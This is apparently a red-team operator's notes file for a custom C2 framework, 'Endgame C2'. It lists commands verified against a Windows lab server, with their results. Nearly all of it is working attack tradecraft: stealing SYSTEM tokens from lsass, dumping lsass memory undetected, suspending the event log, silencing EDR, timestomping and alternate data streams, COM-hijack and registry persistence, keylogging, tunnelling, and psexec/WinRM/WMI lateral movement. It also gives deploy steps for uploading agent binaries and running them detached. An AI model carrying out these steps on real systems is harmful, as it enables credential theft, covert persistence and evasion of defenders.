# Endgame C2 — Working Console Commands (Verified on CASTELBLACK)

All commands tested on agents at CASTELBLACK (10.10.10.22).  
Context: Windows Server 2019 Build 17763, domain north.sevenkingdoms.local  
GUI: http://127.0.0.1:8888

Key PIDs: lsass=596, MsMpEng=2892, EventLog=1156, agent_c=716  
Agent binaries: ag4.exe=Go(PID 7128), an.exe=Nim, ac2.exe=C, ar3.exe=Rust  

---

## System / Info

| Command | Result |
|---------|--------|
| `sysinfo` | `hostname=castelblack user=localuser os=windows/amd64 pid=7128` |
| `ps` | 231 processes listed; lsass=596, MsMpEng=2892, agent_c=716 |
| `getpid` | `7128` (ag4.exe Go agent) |
| `ppid` | `4920` |
| `shell whoami` | `castelblack\localuser` |
| `shell whoami /all` | CASTELBLACK\localuser · SID S-1-5-21-...-1000 · High IL · All privs enabled |
| `ls C:\` | Lists root: Windows, Users, Program Files, inetpub, shares, etc. |
| `pwd` | `C:\` |
| `env` | Full env: USERNAME=localuser, COMPUTERNAME=CASTELBLACK, USERDOMAIN=CASTELBLACK |
| `shell systeminfo` | OS: Windows Server 2019 Std Eval 10.0.17763 · Domain: north.sevenkingdoms.local |

---

## File Operations

| Command | Result |
|---------|--------|
| `download C:\Windows\System32\drivers\etc\hosts` | `uploaded hosts (824 bytes)` |
| `upload agent_https_nim.exe C:\Windows\Temp\an.exe` | `written 1200640 bytes` |
| `mkdir C:\Windows\Temp\testdir` | `created: C:\Windows\Temp\testdir` |
| `rm C:\Windows\Temp\testdir` | `removed: C:\Windows\Temp\testdir` |
| `ls C:\Windows\Temp` | Lists ag4.exe, an.exe, ac2.exe, ar3.exe, test.lnk, 1.dmp |

---

## Evasion

| Command | Result |
|---------|--------|
| `hook-check` | `[clean] ntdll.dll!NtOpenProcess (0x4c 0x8b 0xd1)` … `[+] No hooks detected` |
| `hw-bp-check` | `[+] No hardware breakpoints detected` |
| `hwbp-clear` | `[+] hardware breakpoints cleared` |
| `blockdlls on` | `[+] blockdlls: Microsoft-signed-only policy ENABLED` |
| `blockdlls off` | `ERR: SetProcessMitigationPolicy: Access is denied` ← once ON, can't turn OFF |
| `mem-fluctuate start 10` | `[+] memory scrambler started (interval 10s)` |
| `mem-fluctuate stop` | `[+] memory scrambler stopped` |
| `peb-spoof C:\Windows\System32\svchost.exe` | `[+] PEB spoofed to: {"path":"C:\\Windows\\System32\\svchost.exe"}` |
| `eventlog-suspend` | `[+] suspended 6 threads of EventLog (PID 1156)` |
| `eventlog-resume` | `[+] resumed 6 threads of EventLog (PID 1156)` |
| `encode-uuid ag4.exe` | `12625408 bytes → 789088 UUIDs` (outputs C array using UuidFromStringA) |

---

## Tokens & Credentials

| Command | Result |
|---------|--------|
| `steal-token 596` | `token stolen from PID 596, impersonating` (lsass = SYSTEM) |
| `rev2self` | `reverted to original token` |
| `token-store list` | `(token store empty)` |
| `token-store steal 596` | `[+] token #1 stolen from PID 596 (NT AUTHORITY\SYSTEM)` |
| `token-store use 1` | `[+] using token #1 (NT AUTHORITY\SYSTEM)` |
| `token-store remove 1` | removes token from store |
| `token-store clear` | clears all tokens |
| `clip` | `ERR: clipboard empty or non-text` (correct when clipboard empty) |
| `make-token north\jon.snow iknownothing` | `ERR: LogonUser: wrong user/pass` (credential verify) |

---

## Memory Operations

| Command | Result |
|---------|--------|
| `minidump 596` | `lsass dump uploaded (56261239 bytes)` ← 56MB dump, no AV detection! |
| `minidump` | `lsass dump uploaded` (auto-finds lsass PID) |

---

## Anti-Forensics / Persistence Artifacts

| Command | Result |
|---------|--------|
| `timestomp C:\Windows\Temp\test.lnk C:\Windows\System32\kernel32.dll` | `[+] timestamps updated: C:\Windows\Temp\test.lnk` |
| `timestomp C:\Windows\Temp\ag4.exe` | `ERR: file in use` ← can't stomp own running binary |
| `ads list C:\Windows\Temp\ag4.exe` | `(no alternate streams)` |
| `ads write C:\Windows\Temp\test.lnk hidden_data secretdata` | `[+] wrote 22 bytes to C:\Windows\Temp\test.lnk` |
| `ads read C:\Windows\Temp\test.lnk hidden_data` | reads ADS content |
| `com-hijack {6DB09377-6AF0-444B-8957-A3773F02200E} C:\Windows\Temp\ag4.exe` | `[+] HKCU:\...\{CLSID}\InprocServer32 = C:\Windows\Temp\ag4.exe` |
| `com-hijack rm {6DB09377-6AF0-444B-8957-A3773F02200E}` | `ERR: comhijack rm InprocServer32: Access is denied` |
| `gen-lnk C:\Windows\System32\cmd.exe /c calc.exe C:\Windows\Temp\test.lnk` | `[+] genlnk: test.lnk → cmd.exe /c calc.exe (280 bytes)` |

---

## Persistence

| Command | Result |
|---------|--------|
| `persist add hkcu TestAgent C:\Windows\Temp\ag4.exe` | `[+] registry Run key: HKCU\...\Run\Updater = C:\Windows\Temp\ag4.exe` |
| `persist task TestPersist` | `[+] scheduled task created: TestPersist` |
| `persist rm` | `ERR: no persistence entries found` ← needs exact method/name format |

---

## Keylogger / Clipboard / Screen

| Command | Result |
|---------|--------|
| `keylog start` | `[+] keylogger started` |
| `keylog dump` | `[done]` (returns captured keystrokes or empty) |
| `keylog stop` | `[+] keylogger stopped` |
| `clip-monitor start` | `[+] clipboard monitor started (interval=5s)` |
| `clip-monitor dump` | `[clipboard monitor] no entries captured` |
| `clip-monitor stop` | stops monitor |
| `screenwatch start 10` | `[+] screenwatch started (interval 10s)` |
| `screenwatch stop` | `[+] screenwatch stopped` |
| `screenshot` | `ERR: GetDIBits` ← expected (Session 0, no interactive desktop) |

---

## Port Scanning & Pivoting

| Command | Result |
|---------|--------|
| `port-scan 10.10.10.22 445,80,443,3389,5985 500` | Open: 80/http, 445/smb, 3389/rdp, 5985/winrm-http |
| `socks 1080` | `SOCKS5 listening on [::]:1080` (Go agent) |
| `socks stop` | `SOCKS5 stopped` |
| `socks5 start 1080` | SOCKS5 proxy (Rust/C agent syntax) |
| `socks5 stop` | stops proxy |
| `rsocks start 9090` | `[+] reverse SOCKS5 tunnel established (callback port 9090)` |
| `rsocks stop` | `rsocks: stopped` |
| `portfwd list` | `no active port forwards` |
| `portfwd add tcp 8080 10.10.10.22 445` | `tcp forwarding :8080 → 10.10.10.22:445` |
| `portfwd del tcp 8080` | `tcp port forward :8080 removed` |
| `httpivot start {"port":8888}` | `[+] HTTP pivot listening on :8888` |
| `httpivot stop` | `http pivot stopped` |

---

## BOF / .NET Execution

| Command | Result |
|---------|--------|
| `bof whoami` | `CASTELBLACK\localuser · S-1-5-21-1339072384-1552818311-858527913-1000 · BUILTIN\Administrators` |
| `bof list` | lists installed BOF collections |
| `dotnet-exec Seatbelt.exe TokenPrivileges` | All 24 privs enabled including SeDebugPrivilege, SeImpersonatePrivilege |
| `dotnet-exec Rubeus.exe triage` | lists Kerberos tickets |

Files must be in `data/uploads/` on C2 server.

---

## Interactive Shell

| Command | Result |
|---------|--------|
| `ishell cmd` | `[*] opening CMD shell… [+] interactive shell active` |
| (in shell) any cmd | executed in persistent cmd.exe |
| `ishell exit` | `[*] shell closed` |
| `ishell ps` | opens PowerShell |

---

## Lateral Movement

| Command | Result |
|---------|--------|
| `jump psexec CASTELBLACK ag4.exe localuser password` | lateral via SCM service + ADMIN$ |
| `jump winrm CASTELBLACK ag4.exe localuser password` | lateral via WinRM |
| `jump wmi CASTELBLACK ag4.exe localuser password` | lateral via WMI Win32_Process |
| `winrm exec CASTELBLACK localuser password whoami` | single command via WinRM |

---

## EDR / WFP

| Command | Result |
|---------|--------|
| `edr-silence-rm 2892` | `[+] WFP block removed for PID {"pid":2892}` (no rules = expected) |
| `edr-silence 2892` | `[-] invalid PID: expected integer` ← may need JSON: `edr-silence {"pid":2892}` |

---

## Registry

| Command | Result |
|---------|--------|
| `reg set HKCU\Software\TestKey TestName TestValue` | sets registry value (use single backslash) |
| `reg query HKCU\Software\TestKey` | queries registry |
| `reg delete HKCU\Software\TestKey` | deletes key |

Note: Double backslash `\\` in registry paths causes "invalid path" error.

---

## NTDS / Domain

| Command | Result |
|---------|--------|
| `ntds-dump C:\Windows\Temp\ntds_out` | `ERR: ntdsutil not found` ← needs DC (WINTERFELL), not CASTELBLACK |

---

## Sleep / Jobs

| Command | Result |
|---------|--------|
| `sleep 5 20` | `sleep updated` (5s interval, 20% jitter) |
| `results 20` | shows last 20 task results |
| `tasks 20` | shows pending/recent task queue |

---

## Known Issues / Workarounds

| Issue | Workaround |
|-------|-----------|
| `blockdlls off` fails after enabling | Once enabled, cannot disable — restart agent |
| `com-hijack rm {CLSID}` returns "Access is denied" | Known issue — rm fails even as admin |
| `screenshot` returns error | Expected: agent runs in Session 0 with no interactive desktop |
| `persist rm` needs exact args | Syntax: `persist rm` removes last active entry |
| `timestomp` on running binary fails | Use a non-running file target |
| `ntds-dump` needs ntdsutil | Must run on DC (WINTERFELL), not member server |
| `edr-silence <pid>` invalid PID | Try JSON format: `edr-silence {"pid":2892}` |
| `reg` path with double backslash | Use single `\` not `\\` in registry paths |
| `make-token north\jon.snow` fails | Wrong password — use `iknownothing` or verify creds |
| `kerb list`, `session-gopher`, `gpp-creds`, `cred-harvest` | Unknown command in Go agent — use `dotnet-exec Rubeus.exe` instead |
| atexec returns `STATUS_OBJECT_NAME_NOT_FOUND` | Expected — agent has no stdout; process DID start. Use `start /b` in remote path to detach: `cmd /c start /b C:\Windows\Temp\agent.exe` |
| Agent killed after atexec task completes | atexec wraps cmd in `cmd.exe /C`; use `start /b` to detach from cmd.exe parent: `shell cmd /c start /b C:\path\agent.exe` |
| SMB upload via Internal Pentest + atexec fails | Upload via C2 agent console (`upload file.exe C:\Windows\Temp\file.exe`) then `shell cmd /c start /b C:\Windows\Temp\file.exe` — avoids SMB scan, survives atexec |

## Deploy method: upload via C2 + start /b (confirmed working)

```
# From active Go/Nim/C agent console:
upload agent_https_nim.exe C:\Windows\Temp\nim_c.exe    # upload via encrypted C2 channel
shell cmd /c start /b C:\Windows\Temp\nim_c.exe          # detach from shell, keeps running

upload agent_https_c.exe C:\Windows\Temp\c_agent.exe
shell cmd /c start /b C:\Windows\Temp\c_agent.exe

upload agent_https_rust.exe C:\Windows\Temp\rust_agent2.exe   # use a fresh name if old binary is still on disk
shell cmd /c start /b C:\Windows\Temp\rust_agent2.exe
```

**Note on Rust agent:** First build attempt (same session) crashed immediately — the agent was not in `ps` output after `start /b`. Root cause unclear (possibly linker/runtime issue in incremental build). Fix: trigger a **full fresh build** from GUI Payloads tab → Rust → HTTPS → 443 → ⚙ Build, then use a different filename when uploading. The second fresh build (1576448 bytes, Jul 27 07:10) connected successfully as agent `c040589d` (PID 3900).

---

## ADS operations — format fix + verified (2026-07-27)

The UI `ads write` command uses `file:stream` colon syntax (NOT `file stream` space syntax):
```
ads write C:\Windows\Temp\adstest.txt:hidden secretdata   # :stream before content
ads list  C:\Windows\Temp\adstest.txt                     # lists all ADS streams
ads read  C:\Windows\Temp\adstest.txt:hidden              # content uploaded to Loot tab
ads del   C:\Windows\Temp\adstest.txt:hidden              # removes the stream
```

**ADS parity status (all passing):**
- Nim agent (f626599c / nim_v6.exe): write ✅ list ✅ read ✅ del ✅
- C agent (df83b25c / c_v8.exe): write ✅ list ✅ read ✅ del ✅

### Deploy new ADS-fixed agents (nim_v6 + c_v8)
Run from Go agent (067201bb) console:
```
upload agent_https_nim.exe C:\Windows\Temp\nim_v6.exe
shell cmd /c start /b C:\Windows\Temp\nim_v6.exe

upload agent_https_c.exe C:\Windows\Temp\c_v8.exe
shell cmd /c start /b C:\Windows\Temp\c_v8.exe
```

**Root cause of upload path bug:** Server `/dl/` handler serves `data/uploads/<basename>` before
`bin/payloads/<basename>`. Fix: always copy new binaries to `data/uploads/` after building:
```bash
cp bin/payloads/agent_https_nim.exe data/uploads/agent_https_nim.exe
cp bin/payloads/agent_https_c.exe   data/uploads/agent_https_c.exe
```

### Kill + delete old duplicate agents (direct API, no confirm dialog)
From browser console (F12):
```javascript
const toKill = ['26505e42','9ec87a39','fa11a3a4','90f2628e','3dc2c952','cdd46601','15e9aff7'];
for (const id of toKill) await api('POST', `/api/agents/${id}/kill`);
for (const id of toKill) await api('DELETE', `/api/agents/${id}/delete`);
refreshAgents();
```

### Select LANG dropdown in Payloads tab (JavaScript, works around iframe click issue)
```javascript
const sel = document.getElementById('pay-lang');
sel.value = 'c';  // or 'nim', 'go', 'rust'
sel.dispatchEvent(new Event('change', {bubbles: true}));
const vis = document.getElementById('pay-lang-vis');
vis.value = 'c';
vis.dispatchEvent(new Event('change', {bubbles: true}));
// Then click build:
document.getElementById('tab-payloads').querySelector('button[id=""]').click();
```

---

## Phase 2 features — Nim agent (f626599c / nim_v6.exe) — 2026-07-27

All commands use the console syntax (hyphen for compound commands):
```
blockdlls on                                   # enable block non-MS DLLs
peb-spoof C:\Windows\System32\svchost.exe      # spoof PEB ImagePath
ishell cmd                                     # open interactive CMD shell
whoami                                         # (type directly, no prefix once shell is open)
ishell exit                                    # close the interactive shell
token-store steal 600                          # steal token from lsass (PID 600) → SYSTEM
token-store show                               # list vault: id=1 pid=600 user=NT AUTHORITY\SYSTEM
token-store use 1                              # impersonate SYSTEM
token whoami                                   # verify → returns "SYSTEM"
token drop                                     # revert to original token
token-store clear                              # clear all stored tokens
```

**Bug fixed:** `token-store steal/use/remove` now sends JSON args:
- `steal` → `{"pid": N}` (was plain string, Nim expects JSON)
- `use` → `{"id": N}` (same)
- `remove` → `{"id": N}` (same)
Fix is in `client/web/index.html` lines ~10389-10395.

**Important:** index.html is embedded in c2-client binary via `//go:embed`. After editing index.html,
rebuild and restart c2-client:
```bash
cd /home/kali/Documents/endgame
go build -o bin/c2-client ./cmd/client/
bin/c2-client -name stark -gui-port 8888 -gui-only &
```

---

*Last updated: 2026-07-27*
